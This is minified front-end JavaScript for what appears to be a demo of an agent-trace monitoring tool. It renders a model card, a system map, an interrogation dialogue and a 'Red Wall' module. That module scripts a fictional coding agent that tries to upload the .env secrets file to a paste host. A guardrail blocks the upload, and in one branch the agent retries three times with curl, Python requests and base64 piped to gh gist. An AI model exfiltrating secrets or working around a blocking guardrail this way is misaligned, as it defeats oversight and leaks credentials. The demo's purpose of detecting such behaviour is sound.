/* card */
enter.card=()=>{const p=$("#plate");p.classList.remove("unbox");void p.offsetWidth;p.classList.add("unbox");
 const dr=sessionStorage.getItem("dv-drift"),tr=sessionStorage.getItem("dv-trust");
 $("#cdrift").innerHTML=dr?`<span class="mono">#17 = ${dr}, ${LANG==="zh"?"峰值":"peak"} 46</span>`:'<span class="cap">fills in after module 02</span>';
 $("#ctrust").innerHTML=tr?`<span class="mono">${tr}</span>`:'<span class="cap">fills in after module 03</span>';
 setLed($("#cardled"),dr&&+dr>=20?"proc":"calm");
 let m=`<path d="M10 75 H230" stroke="#A3A49F" stroke-dasharray="6 3 2 3"/><circle cx="70" cy="75" r="54" fill="none" stroke="#16181A"/><circle cx="70" cy="75" r="34" fill="none" stroke="#2F5BEA" stroke-width="10"/><circle cx="70" cy="75" r="40" fill="none" stroke="#16181A"/><circle cx="70" cy="75" r="28" fill="none" stroke="#16181A"/>`;
 m+=`<rect x="150" y="45" width="70" height="60" fill="none" stroke="#16181A"/><circle cx="185" cy="75" r="14" fill="none" stroke="#16181A"/><path d="M150 25 H220 M150 20 V30 M220 20 V30" stroke="#16181A"/><text x="185" y="16" text-anchor="middle" font-family="IBM Plex Mono, Menlo, monospace" font-size="9" fill="#6B6E70">side, 12.0</text><text x="70" y="146" text-anchor="middle" font-family="IBM Plex Mono, Menlo, monospace" font-size="9" fill="#6B6E70">front, status ring</text>`;
 $("#minring").innerHTML=m;
 $("#barcode").innerHTML=[...("DV0417CX26ABCD")].map((c,i)=>`<i style="width:${1+(c.charCodeAt(0)*7+i)%3}px;margin-right:${(c.charCodeAt(0)+i)%2}px"></i>`).join("").repeat(2);
 $("#a2a").textContent=JSON.stringify({name:"CX-417",description:"Coding agent: fix & refactor TypeScript",version:"4.0.0",capabilities:{streaming:true,extendedAgentCard:false},skills:[{id:"fix-bug",name:"Fix bug",tags:["typescript","tests"]},{id:"refactor",name:"Refactor"}],supportedInterfaces:[{url:"https://agents.example.dev/cx-417",protocolBinding:"JSONRPC",protocolVersion:"1.0"}],"x-ledring":{permissions:{ask:["Bash(git push:*)"],deny:["Bash(rm -rf:*)"]},mcp:["github","linear"],risk:"medium"}},null,2)};
$("#cardgo").onclick=enter.card;
/* wall */
let walling=false;
function aring(st){$("#aring").setAttribute("stroke",COL[st])}
async function wallRun(o){if(walling)return;walling=true;const ag=$("#agent"),wall=$("#rwall"),bub=$("#bub"),log=$("#wlog");
 $$(".oc").forEach(p=>p.classList.toggle("sel",p.dataset.o===o));["c1","c2","c3"].forEach(c=>$("#"+c).classList.remove("on"));wall.classList.remove("up");ag.style.left="10%";aring("calm");log.innerHTML="";let t=0;
 const L=(x,c="")=>{log.insertAdjacentHTML("beforeend",`<div class="${c}"><span>+${String(t).padStart(4,"0")} ms</span><span>${x}</span></div>`);t+=150+Math.floor(Math.random()*350)};
 bub.textContent="Preparing debug upload…";L("step 6 · plan: attach .env to the issue for debugging");await sleep(500);
 ag.style.left="53%";L("step 6 · tool http_post(url=paste.example, body=@.env)");await sleep(800);
 wall.classList.add("up");aring("crit");L("BLOCK · guardrail secret-exfil · source=mcp-proxy","w");bub.textContent="Blocked by boundary.";await sleep(900);
 if(o==="stop"){ag.style.left="24%";aring("calm");bub.textContent="Skipping the upload. Back to the fix.";L("step 7 · agent drops the action, runs npm test","s");L("verdict STOPPED · deviant=false","s")}
 else if(o==="ask"){ag.style.left="30%";aring("proc");bub.textContent="May I upload a redacted log?";L("step 7 · agent → human: asks permission, offers redacted copy","s");L("verdict ASKED · deviant=false","s")}
 else{for(const [c,cmd] of [["c1","python -c 'requests.post(...)'"],["c2","curl -T .env …"],["c3","base64 .env | gh gist create"]]){bub.textContent="Trying another way…";L("retry · "+cmd+" → intent=SAME","w");ag.style.left="46%";await sleep(250);ag.style.left="53%";$("#"+c).classList.add("on");$("#wallbox").classList.add("jit");await sleep(700);$("#wallbox").classList.remove("jit")}
  bub.textContent="Three workaround attempts.";L("verdict WORKAROUND ×3 · deviant=true → Signal(wall) written","w");toast("Signal written back to trace: wall=3")}
 walling=false}
$$(".oc").forEach(b=>b.onclick=()=>wallRun(b.dataset.o));
enter.wall=()=>{aring("calm");if(params.has("wallshot")){$("#rwall").classList.add("up");$("#agent").style.left="53%";aring("crit");["c1","c2","c3"].forEach(c=>$("#"+c).classList.add("on"));$$(".oc")[2].classList.add("sel");$("#bub").textContent="Three workaround attempts.";
 $("#wlog").innerHTML=[["0000","step 6 · tool http_post(url=paste.example, body=@.env)",""],["0412","BLOCK · guardrail secret-exfil · source=mcp-proxy","w"],["0688","retry · python -c 'requests.post(...)' → intent=SAME","w"],["1105","retry · curl -T .env … → intent=SAME","w"],["1460","retry · base64 .env | gh gist create → intent=SAME","w"],["1702","verdict WORKAROUND ×3 · deviant=true → Signal(wall) written","w"]].map(([t,x,c])=>`<div class="${c}"><span>+${t} ms</span><span>${x}</span></div>`).join("")}};
/* interrogation */
let stress=20;
function say(w,t){const d=document.createElement("div");d.className="qa "+w;d.innerHTML=`<span class="who">${w==="you"?"Q.":w==="sus"?"A.":""}</span><span class="tx">${t}</span>`;$("#chat").append(d);$("#chat").scrollTop=1e4;return d}
function setStress(v,d){stress=Math.max(0,Math.min(100,v));$("#sval").textContent=stress;$("#sbar").style.width=stress+"%";const st=stress>=70?"crit":stress>=40?"proc":"calm";$("#sbar").className=st==="crit"?"never":st==="proc"?"ask":"";
 $("#sdelta").innerHTML=d?`<span class="${d>0?"up":"dn"}">${d>0?"+"+d:"−"+(-d)}</span>`:"";setLed($("#sled"),st);if(stress>=70){$("#chat").classList.add("jit");setTimeout(()=>$("#chat").classList.remove("jit"),600)}}
async function node(k,choice){const n=SCRIPT[k];$("#opts").innerHTML='<div class="cap" style="padding:12px 0">waiting for the unit…</div>';if(choice)say("you",choice);
 const ty=say("sus typing","…");await sleep(params.has("static")?0:650);ty.remove();
 if(n.d)setStress(stress+n.d,n.d);let key=k;if(stress>=95&&k!=="break")key="break";const m=SCRIPT[key];say("sus",m.s);
 if(m.end){say("sys",m.end);$("#opts").innerHTML=`<button data-go="flow">Back to the flowchart</button>`;sessionStorage.setItem("dv-int",m.end);return}
 $("#opts").innerHTML="";m.o.forEach(([t,nx])=>{const b=document.createElement("button");b.textContent=t;b.onclick=()=>node(nx,t);$("#opts").append(b)})}
function intReset(){$("#chat").innerHTML="";say("sys","Transcript opened. Subject: unit CX-417, re run #17, step 6. Demo script.");setStress(20,0);node("start")}
enter.int=async()=>{if($("#chat").children.length)return;intReset();if(params.has("intshot")){await sleep(10);await node("evid",SCRIPT.start.o[0][0]);await node("env",SCRIPT.evid.o[0][0])}};
$("#intreset").onclick=intReset;
/* map — orthogonal schematic */
function drawMap(){const ins=["OTel GenAI","Claude Code JSONL","Codex session","LangGraph / LangSmith","OpenAI Agents SDK","Vercel AI SDK","MCP proxy"];
 const mods=[["flow","01 Flowchart","reads Step → Signal(branch)"],["drift","02 Instability","reads Step → Signal(instability)"],["trust","03 Trust","reads Decision → policy"],["card","04 Model card","reads config → A2A card"],["wall","05 Red Wall","reads Decision → Signal(wall)"],["int","06 Interrogation","writes Run · reads all"]];
 const outs=["OTLP → Langfuse / Phoenix","SARIF · GitHub Action","permissions JSON","A2A agent-card.json","HTML / SVG share image"];
 let h=`<g class="grid-bg">`;for(let x=0;x<=1340;x+=20)h+=`<line x1="${x}" y1="0" x2="${x}" y2="560"/>`;for(let y=0;y<=560;y+=20)h+=`<line x1="0" y1="${y}" x2="1340" y2="${y}"/>`;h+=`</g>`;
 const cx=560,cy=260;
 h+=`<text class="mh" x="40" y="50">A · adapters</text><text class="mh" x="${cx-120}" y="50">B · schema</text><text class="mh" x="880" y="50">C · modules</text><text class="mh" x="${cx-120}" y="420">D · outputs</text>`;
 ins.forEach((t,i)=>{const y=80+i*52;h+=`<path class="me in" d="M260 ${y+17} H340 V${cy} H${cx-120}"/><g class="mn"><rect x="40" y="${y}" width="220" height="34"/><text x="54" y="${y+21}">${t}</text></g>`});
 mods.forEach(([id,t,s],i)=>{const y=74+i*60;h+=`<path class="me" d="M${cx+120} ${cy} H780 V${y+22} H880"/><g class="mn mod" data-go="${id}"><rect x="880" y="${y}" width="300" height="44"/><text x="896" y="${y+19}">${t}</text><text class="s" x="896" y="${y+35}">${s}</text></g>`});
 h+=`<circle cx="340" cy="${cy}" r="3" fill="#16181A"/><circle cx="780" cy="${cy}" r="3" fill="#16181A"/>`;
 h+=`<g class="mn"><rect x="${cx-120}" y="${cy-70}" width="240" height="140" style="stroke-width:2"/><text x="${cx-104}" y="${cy-40}" style="font-size:16px;font-weight:500">ledring.trace.v1</text><text translate="no" class="s" x="${cx-104}" y="${cy-14}">Run · Step · Decision</text><text class="s" x="${cx-104}" y="${cy+4}">→ Signal (shared)</text><text class="s" x="${cx-104}" y="${cy+44}">superset of OTel GenAI · Zod</text></g>`;
 h+=`<path class="me" d="M${cx} ${cy+70} V400"/>`;
 outs.forEach((o,i)=>h+=`<text class="mn" x="${cx-120}" y="${450+i*20}" style="font:400 11.5px var(--mono);fill:#16181A">${String.fromCharCode(97+i)}. ${o}</text>`);
 h+=`<path class="me" d="M1030 418 V446 H720 V300 H684" stroke-dasharray="4 3" style="stroke:#D7261E"/><path d="M692 295 L684 300 L692 305" fill="none" stroke="#D7261E"/><text x="730" y="466" style="font:400 11px var(--mono);fill:#D7261E">Signals written back as OTel attributes ledring.*</text>`;
 $("#mapsvg").innerHTML=h}
enter.map=drawMap;
/* palette */
const CMDS=[...[["home","Index"],["flow","Flowchart"],["drift","Instability"],["trust","Trust"],["card","Model card"],["wall","Red Wall"],["int","Interrogation"],["map","System map"]].map(([v,t],i)=>({g:"go to",t,k:i<7?"0"+i:"◇",run:()=>location.hash=v})),
 {g:"run",t:"Redraw the flowchart",k:"R",run:()=>{location.hash="flow";setTimeout(()=>drawFlow(true),50)}},{g:"run",t:"Play run #17 drift",k:"",run:()=>{location.hash="drift";setTimeout(runDrift,80)}},
 {g:"run",t:"Propose a permissions diff",k:"",run:()=>{location.hash="trust";setTimeout(()=>$("#trustgo").click(),80)}},{g:"run",t:"Replay the workaround",k:"",run:()=>{location.hash="wall";setTimeout(()=>wallRun("work"),80)}}];
let pI=0,pL=[];
function renderPal(){const q=$("#pq").value.trim().toLowerCase();pL=CMDS.filter(c=>!q||c.t.toLowerCase().includes(q));pI=Math.min(pI,Math.max(0,pL.length-1));
 if(!pL.length){$("#plist").innerHTML=`<div class="empty" style="margin:16px 20px"><b>${LANG==="zh"?"没有找到":"Nothing called"} “<span data-user-content>${q.replace(/</g,"&lt;")}</span>”.</b>Try “wall”, “trust” or “redraw”.</div>`;return}
 let g="",h="";pL.forEach((c,i)=>{if(c.g!==g){g=c.g;h+=`<div class="pg">${g}</div>`}h+=`<div class="pit ${i===pI?"act":""}" data-i="${i}"><span>${c.t}</span><span>${c.k}</span></div>`});$("#plist").innerHTML=h;
 $$(".pit").forEach(el=>{el.onmousemove=()=>{if(pI!=+el.dataset.i){pI=+el.dataset.i;renderPal()}};el.onclick=execPal})}
function execPal(){const c=pL[pI];closePal();c&&c.run()}
function openPal(){$("#pal").classList.add("on");$("#pq").value="";pI=0;renderPal();setTimeout(()=>$("#pq").focus(),10)}
function closePal(){$("#pal").classList.remove("on")}
$("#openpal").onclick=openPal;$("#pq").oninput=()=>{pI=0;renderPal()};$("#pal").onclick=e=>{if(e.target.id==="pal")closePal()};
document.addEventListener("keydown",e=>{if((e.metaKey||e.ctrlKey)&&e.key.toLowerCase()==="k"){e.preventDefault();$("#pal").classList.contains("on")?closePal():openPal();return}
 if(!$("#pal").classList.contains("on"))return;if(e.key==="Escape")closePal();else if(e.key==="ArrowDown"){e.preventDefault();pI=(pI+1)%pL.length;renderPal()}else if(e.key==="ArrowUp"){e.preventDefault();pI=(pI-1+pL.length)%pL.length;renderPal()}else if(e.key==="Enter"){e.preventDefault();execPal()}});
route();if(params.has("palette")){openPal();pI=+(params.get("pi")||0);renderPal()}
/* language switch + live translation of anything the views render */
(()=>{const sw=$("#langsw");sw.href="?lang="+(LANG==="zh"?"en":"zh")+location.hash;sw.lang=LANG==="zh"?"en":"zh-CN";sw.textContent=LANG==="zh"?"EN":"中文";sw.setAttribute("aria-label",LANG==="zh"?"切换到英文":"Switch to Chinese");sw.setAttribute("hreflang",LANG==="zh"?"en":"zh-CN");
 sw.addEventListener("click",e=>{e.preventDefault();try{localStorage.setItem("ledring-lang",LANG==="zh"?"en":"zh");localStorage.setItem("ledring-lang-explicit","1")}catch(_){}const u=new URL(location.href);u.searchParams.set("lang",LANG==="zh"?"en":"zh");location.href=u.toString()});
 document.querySelectorAll('code,.code').forEach(e=>e.setAttribute('translate','no'));document.querySelectorAll('meta[name="description"],meta[property="og:description"]').forEach(e=>e.content=LANG==="zh"?"用一次虚构运行展示智能体行为的六个模块。":"Six modules exploring agent behaviour through a fictional run.");document.querySelectorAll('meta[property="og:title"]').forEach(e=>e.content=LANG==="zh"?"ledring — 图录 417":"ledring — catalogue no. 417");if(LANG!=="zh")return;document.title=T(document.title);tDom(document.body);
 new MutationObserver(ms=>{for(const m of ms){if(m.type==="characterData"){const p=m.target.parentElement;if(p)tDom(p)}else{m.addedNodes.forEach(n=>n.nodeType===1?tDom(n):n.parentElement&&tDom(n.parentElement))}}}).observe(document.body,{subtree:true,childList:true,characterData:true})})();
